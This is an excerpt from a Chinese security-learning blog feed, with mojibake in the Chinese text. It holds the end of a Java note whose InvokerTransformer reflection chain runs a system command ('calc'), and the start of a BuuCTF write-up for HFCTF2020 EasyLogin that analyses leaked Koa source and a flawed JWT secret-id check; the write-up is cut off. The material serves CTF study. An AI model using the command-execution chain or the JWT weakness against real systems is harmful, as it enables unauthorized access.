&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å†…éƒ¨ç±»çš„è®¿é—®ç‰¹ç‚¹ï¼š</p><ul><li>å†…éƒ¨ç±»å¯ä»¥ç›´æ¥è®¿é—®å¤–éƒ¨ç±»çš„æˆå‘˜ï¼ŒåŒ…æ‹¬ç§æœ‰</li><li>å¤–éƒ¨ç±»è¦è®¿é—®å†…éƒ¨ç±»çš„æˆå‘˜ï¼Œå¿…é¡»åˆ›å»ºå¯¹è±¡</li></ul><p>P192 æ³›å‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer; <span class="hljs-comment">// å¯¼å…¥ Apache Commons Collections ä¸­çš„ Transformer ç±»</span><br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer; <span class="hljs-comment">// å¯¼å…¥ Apache Commons Collections ä¸­çš„ InvokerTransformer ç±»</span><br><span class="hljs-keyword">import</span> org.omg.SendingContext.RunTime; <span class="hljs-comment">// å¯¼å…¥é”™è¯¯çš„ RunTime ç±»ï¼Œåº”è¯¥æ˜¯ java.lang.Runtime</span><br><span class="hljs-keyword">import</span> java.lang.reflect.Method; <span class="hljs-comment">// å¯¼å…¥ Java åå°„ä¸­çš„ Method ç±»</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªè°ƒç”¨ getMethod æ–¹æ³•çš„ InvokerTransformer å¯¹è±¡ï¼Œå‚æ•°æ˜¯ String.class å’Œ Class[].class</span><br>        <span class="hljs-comment">// ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯æ–¹æ³•åç§° &quot;getRuntime&quot;ï¼Œå› æ­¤è¿™ä¸ª InvokerTransformer çš„ç›®çš„æ˜¯è·å– Runtime ç±»ä¸­åä¸º getRuntime çš„æ–¹æ³•</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getRuntimeMethod</span> <span class="hljs-operator">=</span> (Method) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;).transform(Runtime.class);<br>        <br>        <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªè°ƒç”¨ invoke æ–¹æ³•çš„ InvokerTransformer å¯¹è±¡ï¼Œå‚æ•°æ˜¯ Object.class å’Œ Object[].class</span><br>        <span class="hljs-comment">// ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ &#123;null, null&#125;ï¼Œå³å¯¹åº” invoke æ–¹æ³•çš„å‚æ•°åˆ—è¡¨ä¸º &#123;null, null&#125;</span><br>        <span class="hljs-comment">// è¿™ä¸ª InvokerTransformer çš„ç›®çš„æ˜¯è°ƒç”¨ getRuntimeMethod å¯¹è±¡çš„ invoke æ–¹æ³•</span><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> (Runtime) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;).transform(getRuntimeMethod);<br><br>        <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªè°ƒç”¨ exec æ–¹æ³•çš„ InvokerTransformer å¯¹è±¡ï¼Œå‚æ•°æ˜¯ String.class</span><br>        <span class="hljs-comment">// ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ &quot;calc&quot;ï¼Œå³è¦æ‰§è¡Œçš„å‘½ä»¤ä¸º &quot;calc&quot;ï¼Œè¿™ä¸ª InvokerTransformer çš„ç›®çš„æ˜¯æ‰§è¡Œè®¡ç®—å™¨ç¨‹åº</span><br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Obj</span>  ect[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;).transform(r);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BuuCTFåšé¢˜è®°å½•_7</title>
    <link href="/2023/12/27/BuuCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_7/"/>
    <url>/2023/12/27/BuuCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_7/</url>
    
    <content type="html"><![CDATA[<p>åˆå­¦è€…çš„ä¸€äº›åšé¢˜è®°å½•</p><span id="more"></span><hr><h2 id="HFCTF2020-EasyLogin"><a href="#HFCTF2020-EasyLogin" class="headerlink" title="[HFCTF2020]EasyLogin"></a>[HFCTF2020]EasyLogin</h2><p><img src="/img/hfctf2020ezlogin1.png" alt="hfctf2020ezlogin1"></p><p>æºç ä¸­å­˜åœ¨<code>/static/js/app.js</code>:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *  æˆ–è®¸è¯¥ç”¨ koa-static æ¥å¤„ç†é™æ€æ–‡ä»¶</span><br><span class="hljs-comment"> *  è·¯å¾„è¯¥æ€ä¹ˆé…ç½®ï¼Ÿä¸ç®¡äº†å…ˆå¡«ä¸ªæ ¹ç›®å½•XD</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">login</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> username = $(<span class="hljs-string">&quot;#username&quot;</span>).<span class="hljs-title function_">val</span>();<br>    <span class="hljs-keyword">const</span> password = $(<span class="hljs-string">&quot;#password&quot;</span>).<span class="hljs-title function_">val</span>();<br>    <span class="hljs-keyword">const</span> token = <span class="hljs-variable language_">sessionStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&quot;token&quot;</span>);<br>    $.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/api/login&quot;</span>, &#123;username, password, <span class="hljs-attr">authorization</span>:token&#125;)<br>        .<span class="hljs-title function_">done</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) &#123;<br>            <span class="hljs-keyword">const</span> &#123;status&#125; = data;<br>            <span class="hljs-keyword">if</span>(status) &#123;<br>                <span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;/home&quot;</span>;<br>            &#125;<br>        &#125;)<br>        .<span class="hljs-title function_">fail</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">xhr, textStatus, errorThrown</span>) &#123;<br>            <span class="hljs-title function_">alert</span>(xhr.<span class="hljs-property">responseJSON</span>.<span class="hljs-property">message</span>);<br>        &#125;);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">register</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> username = $(<span class="hljs-string">&quot;#username&quot;</span>).<span class="hljs-title function_">val</span>();<br>    <span class="hljs-keyword">const</span> password = $(<span class="hljs-string">&quot;#password&quot;</span>).<span class="hljs-title function_">val</span>();<br>    $.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/api/register&quot;</span>, &#123;username, password&#125;)<br>        .<span class="hljs-title function_">done</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) &#123;<br>            <span class="hljs-keyword">const</span> &#123; token &#125; = data;<br>            <span class="hljs-variable language_">sessionStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&#x27;token&#x27;</span>, token);<br>            <span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;/login&quot;</span>;<br>        &#125;)<br>        .<span class="hljs-title function_">fail</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">xhr, textStatus, errorThrown</span>) &#123;<br>            <span class="hljs-title function_">alert</span>(xhr.<span class="hljs-property">responseJSON</span>.<span class="hljs-property">message</span>);<br>        &#125;);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">logout</span>(<span class="hljs-params"></span>) &#123;<br>    $.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/api/logout&#x27;</span>).<span class="hljs-title function_">done</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) &#123;<br>        <span class="hljs-keyword">const</span> &#123;status&#125; = data;<br>        <span class="hljs-keyword">if</span>(status) &#123;<br>            <span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&#x27;/login&#x27;</span>;<br>        &#125;<br>    &#125;);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getflag</span>(<span class="hljs-params"></span>) &#123;<br>    $.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/api/flag&#x27;</span>).<span class="hljs-title function_">done</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) &#123;<br>        <span class="hljs-keyword">const</span> &#123;flag&#125; = data;<br>        $(<span class="hljs-string">&quot;#username&quot;</span>).<span class="hljs-title function_">val</span>(flag);<br>    &#125;).<span class="hljs-title function_">fail</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">xhr, textStatus, errorThrown</span>) &#123;<br>        <span class="hljs-title function_">alert</span>(xhr.<span class="hljs-property">responseJSON</span>.<span class="hljs-property">message</span>);<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>èƒ½æ­£å¸¸è®¿é—®ï¼Œåˆæ­¥çŒœæµ‹æ˜¯æºç æ³„éœ²ï¼Ÿ</p><p>æœ‰å…³<code>koa-static</code>çš„ç›®å½•ç»“æ„ï¼Œå‚è€ƒï¼š<code>(https://blog.csdn.net/fmyyy1/article/details/115674235)</code></p><p><img src="/img/hfctf2020ezlogin2.png" alt="hfctf2020ezlogin2"></p><p><code>app.js/</code>:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">Koa</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;koa&#x27;</span>);<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;koa-bodyparser&#x27;</span>);<br><span class="hljs-keyword">const</span> session = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;koa-session&#x27;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">static</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;koa-static&#x27;</span>);<br><span class="hljs-keyword">const</span> views = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;koa-views&#x27;</span>);<br><br><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br><span class="hljs-keyword">const</span> &#123; resolve &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><br><span class="hljs-keyword">const</span> rest = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./rest&#x27;</span>);<br><span class="hljs-keyword">const</span> controller = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./controller&#x27;</span>);<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PORT</span> = <span class="hljs-number">3000</span>;<br><span class="hljs-keyword">const</span> app = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Koa</span>();<br><br>app.<span class="hljs-property">keys</span> = [crypto.<span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>)];<br><span class="hljs-variable language_">global</span>.<span class="hljs-property">secrets</span> = [];<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">static</span>(<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">&#x27;.&#x27;</span>)));<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">views</span>(<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">&#x27;./views&#x27;</span>), &#123;<br>  <span class="hljs-attr">extension</span>: <span class="hljs-string">&#x27;pug&#x27;</span><br>&#125;));<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">session</span>(&#123;<span class="hljs-attr">key</span>: <span class="hljs-string">&#x27;sses:aok&#x27;</span>, <span class="hljs-attr">maxAge</span>: <span class="hljs-number">86400000</span>&#125;, app));<br><br><span class="hljs-comment">// parse request body:</span><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">bodyParser</span>());<br><br><span class="hljs-comment">// prepare restful service</span><br>app.<span class="hljs-title function_">use</span>(rest.<span class="hljs-title function_">restify</span>());<br><br><span class="hljs-comment">// add controllers:</span><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">controller</span>());<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-variable constant_">PORT</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`app started at port <span class="hljs-subst">$&#123;PORT&#125;</span>...`</span>);<br></code></pre></td></tr></table></figure><p>ä¸æ˜¯å¾ˆæ‡‚ä¸ºå•¥å»è®¿é—®<code>controllers/api.js</code>ã€‚ã€‚ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)<br><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>)<br><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">APIError</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../rest&#x27;</span>).<span class="hljs-property">APIError</span>;<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>    <span class="hljs-string">&#x27;POST /api/register&#x27;</span>: <span class="hljs-keyword">async</span> (ctx, next) =&gt; &#123;<br>        <span class="hljs-keyword">const</span> &#123;username, password&#125; = ctx.<span class="hljs-property">request</span>.<span class="hljs-property">body</span>;<br><br>        <span class="hljs-keyword">if</span>(!username || username === <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;register error&#x27;</span>, <span class="hljs-string">&#x27;wrong username&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">global</span>.<span class="hljs-property">secrets</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">100000</span>) &#123;<br>            <span class="hljs-variable language_">global</span>.<span class="hljs-property">secrets</span> = [];<br>        &#125;<br><br>        <span class="hljs-keyword">const</span> secret = crypto.<span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">18</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>        <span class="hljs-keyword">const</span> secretid = <span class="hljs-variable language_">global</span>.<span class="hljs-property">secrets</span>.<span class="hljs-property">length</span>;<br>        <span class="hljs-variable language_">global</span>.<span class="hljs-property">secrets</span>.<span class="hljs-title function_">push</span>(secret)<br><br>        <span class="hljs-keyword">const</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123;secretid, username, password&#125;, secret, &#123;<span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;HS256&#x27;</span>&#125;);<br><br>        ctx.<span class="hljs-title function_">rest</span>(&#123;<br>            <span class="hljs-attr">token</span>: token<br>        &#125;);<br><br>        <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>();<br>    &#125;,<br><br>    <span class="hljs-string">&#x27;POST /api/login&#x27;</span>: <span class="hljs-keyword">async</span> (ctx, next) =&gt; &#123;<br>        <span class="hljs-keyword">const</span> &#123;username, password&#125; = ctx.<span class="hljs-property">request</span>.<span class="hljs-property">body</span>;<br><br>        <span class="hljs-keyword">if</span>(!username || !password) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;login error&#x27;</span>, <span class="hljs-string">&#x27;username or password is necessary&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">const</span> token = ctx.<span class="hljs-property">header</span>.<span class="hljs-property">authorization</span> || ctx.<span class="hljs-property">request</span>.<span class="hljs-property">body</span>.<span class="hljs-property">authorization</span> || ctx.<span class="hljs-property">request</span>.<span class="hljs-property">query</span>.<span class="hljs-property">authorization</span>;<br><br>        <span class="hljs-keyword">const</span> sid = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(token.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">1</span>], <span class="hljs-string">&#x27;base64&#x27;</span>).<span class="hljs-title function_">toString</span>()).<span class="hljs-property">secretid</span>;<br><br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(sid)<br><br>        <span class="hljs-keyword">if</span>(sid === <span class="hljs-literal">undefined</span> || sid === <span class="hljs-literal">null</span> || !(sid &lt; <span class="hljs-variable language_">global</span>.<span class="hljs-property">secrets</span>.<span class="hljs-property">length</span> &amp;&amp; sid &gt;= <span class="hljs-number">0</span>)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;login error&#x27;</span>, <span class="hljs-string">&#x27;no such secret id&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">const</span> secret = <span class="hljs-variable language_">global</span>.<span class="hljs-property">secrets</span>[sid];<br><br>        <span class="hljs-keyword">const</span> user = jwt.<span class="hljs-title function_">verify</span>(token, secret, &#123;<span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;HS256&#x27;</span>&#125;);<br><br>        <span class="hljs-keyword">const</span> status = username === user.<span class="hljs-property">username</span> &amp;&amp; password === user.<span class="hljs-property">password</span>;<br><br>        <span class="hljs-keyword">if</span>(status) &#123;<br>            ctx.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> = username;<br>        &#125;<br><br>        ctx.<span class="hljs-title function_">rest</span>(&#123;<br>            status<br>        &#125;);<br><br>        <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>();<br>    &#125;,<br><br>    <span class="hljs-string">&#x27;GET /api/flag&#x27;</span>: <span class="hljs-keyword">async</span> (ctx, next) =&gt; &#123;<br>        <span class="hljs-keyword">if</span>(ctx.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> !== <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;permission error&#x27;</span>, <span class="hljs-string">&#x27;permission denied&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">const</span> flag = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>).<span class="hljs-title function_">toString</span>();<br>        ctx.<span class="hljs-title function_">rest</span>(&#123;<br>            flag<br>        &#125;);<br><br>        <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>();<br>    &#125;,<br><br>    <span class="hljs-string">&#x27;GET /api/logout&#x27;</span>: <span class="hljs-keyword">async</span> (ctx, next) =&gt; &#123;<br>        ctx.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> = <span class="hljs-literal">null</span>;<br>        ctx.<span class="hljs-title function_">rest</span>(&#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-literal">true</span><br>        &#125;)<br>        <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>();<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>å…ˆçœ‹å¯¹ç”¨æˆ·åçš„é™åˆ¶éƒ¨åˆ†ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span>(!username || username === <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;register error&#x27;</span>, <span class="hljs-string">&#x27;wrong username&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œè§„å®š<code>username</code>ä¸èƒ½ä¸ºç©ºæˆ–ä¸èƒ½å¼ºç­‰äº<code>admin</code>ï¼Œå¦åˆ™ä¼šæŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ã€‚</p><p><code>JWT</code>çš„æ„é€ éƒ¨åˆ†ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> secret = crypto.<span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">18</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br><span class="hljs-keyword">const</span> secretid = <span class="hljs-variable language_">global</span>.<span class="hljs-property">secrets</span>.<span class="hljs-property">length</span>;<br><span class="hljs-variable language_">global</span>.<span class="hljs-property">secrets</span>.<span class="hljs-title function_">push</span>(secret)<br><br><span class="hljs-keyword">const</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123;secretid, username, password&#125;, secret, &#123;<span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;HS256&#x27;</span>&#125;);<br></code></pre></td></tr></table></figure><p>ç®€å•è¯´å°±æ˜¯éšæœºç”Ÿæˆä¸€ä¸²åå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œç„¶åæŠŠå®ƒçš„é•¿åº¦èµ‹å€¼ç»™<code>secretid</code>ã€‚ç¬¬ä¸‰è¡Œå°±æ˜¯å»ç”Ÿæˆ<code>JSON Web Token</code>ï¼š</p><p><img src="/img/hfctf2020ezlogin3.png" alt="hfctf2020ezlogin3"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> token = ctx.<span class="hljs-property">header</span>.<span class="hljs-property">authorization</span> || ctx.<span class="hljs-property">request</span>.<span class="hljs-property">body</span>.<span class="hljs-property">authorization</span> || ctx.<span class="hljs-property">request</span>.<span class="hljs-property">query</span>.<span class="hljs-property">authorization</span>;<br><br><span class="hljs-keyword">const</span> sid = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(token.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">1</span>], <span class="hljs-string">&#x27;base64&#x27;</span>).<span class="hljs-title function_">toString</span>()).<span class="hljs-property">secretid</span>;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(sid)<br><br><span class="hljs-keyword">if</span>(sid === <span class="hljs-literal">undefined</span> || sid === <span class="hljs-literal">null</span> || !(sid &lt; <span class="hljs-variable language_">global</span>.<span class="hljs-property">secrets</span>.<span class="hljs-property">length</span> &amp;&amp; sid &gt;= <span class="hljs-number">0</span>)) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;login error&#x27;</span>, <span class="hljs-string">&#x27;no such secret 